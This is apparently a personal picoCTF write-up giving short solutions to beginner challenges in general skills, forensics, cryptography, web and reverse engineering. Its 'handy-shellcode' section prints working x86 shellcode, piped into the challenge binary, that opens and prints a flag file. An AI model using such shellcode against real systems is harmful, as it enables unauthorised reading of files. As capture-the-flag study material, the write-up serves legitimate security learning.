# picoCTF

I will update this as I work through all of the challenges. I highly recommend trying them on your own before reading my solutions.

## General Skills

#### 2 Warm
This type of problem is really easy to solve with python. Open python in your terminal and use ```bin()``` to convert the number to binary.

#### Let's Warm Up
This is another one that is really easy with python. When converting hexadecimal to ASCII my method of choice is to use ```chr()```

### Warmed Up
Another easy python challenge to convert to decimal ```int('0x3D', 16)```

## Forensics

#### Glory of the Garden
I went straight to the basics on this one. Flags are often hidden at the end of the image, and since we know the flag format we can search for it with ```strings garden.jpg | grep "pico"```

#### unzip
Another easy one, just unzip.

## Cryptography

#### The Numbers
This is another once where knowing the flag format helps us out significantly. We can see ```{ }``` which is part of our flag format, and can also see that none of the numbers are greater than 26. This probably means it's a simple substitution cypher. To solve this I wrote a pythons script that takes the alphabet and the provided numbers to print out the flag. ```python the_numbers.py```

## Binary Exploitation

#### handy-shellcode
This wasn't too hard but I always have the most fun with these. There's no overflow required for this challenge, just basic shellcode really. The first thing I did was convert the path of the file to shellcode:

<code>
\x68\x74\x00\x00\x00\x68\x67\x2e\x74\x78\x68\x2f\x66\x6c\x61\x68\x33\x33\x65\x62\x68\x35\x35\x64\x32\x68\x64\x31\x36\x37\x68\x32\x39\x31\x66\x68\x32\x64\x36\x34\x68\x61\x38\x31\x36\x68\x34\x65\x31\x32\x68\x66\x30\x62\x38\x68\x65\x5f\x36\x5f\x68\x6c\x63\x6f\x64\x68\x73\x68\x65\x6c\x68\x6e\x64\x79\x2d\x68\x73\x2f\x68\x61\x68\x62\x6c\x65\x6d\x68\x2f\x70\x72\x6f
</code><br/><br/>

Then I completed it by adding the instructions to read the file, and executing the shellcode:
  
<code>
echo -e '\x31\xc9\x51\x68\x74\x00\x00\x00\x68\x67\x2e\x74\x78\x68\x2f\x66\x6c\x61\x68\x33\x33\x65\x62\x68\x35\x35\x64\x32\x68\x64\x31\x36\x37\x68\x32\x39\x31\x66\x68\x32\x64\x36\x34\x68\x61\x38\x31\x36\x68\x34\x65\x31\x32\x68\x66\x30\x62\x38\x68\x65\x5f\x36\x5f\x68\x6c\x63\x6f\x64\x68\x73\x68\x65\x6c\x68\x6e\x64\x79\x2d\x68\x73\x2f\x68\x61\x68\x62\x6c\x65\x6d\x68\x2f\x70\x72\x6f\x31\xc0\xb0\x05\x89\xe3\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xfe\xc2\xcd\x80\x50\x53\x31\xc0\xb0\x04\x31\xdb\xfe\xc3\xcd\x80\x5b\x58\x83\xf8\x01\x74\xe1\xb0\x06\xcd\x80\xb0\x01\xcd\x80' | ./vuln
</code>

#### practice-run-1
This one is too simple to need an explanation.

## Web Exploitation

#### Insp3ct0r
This one really doesn't need much info. Read all of the source code.

## Reverse Engineering

#### vault-door-training
Source code is your friend.
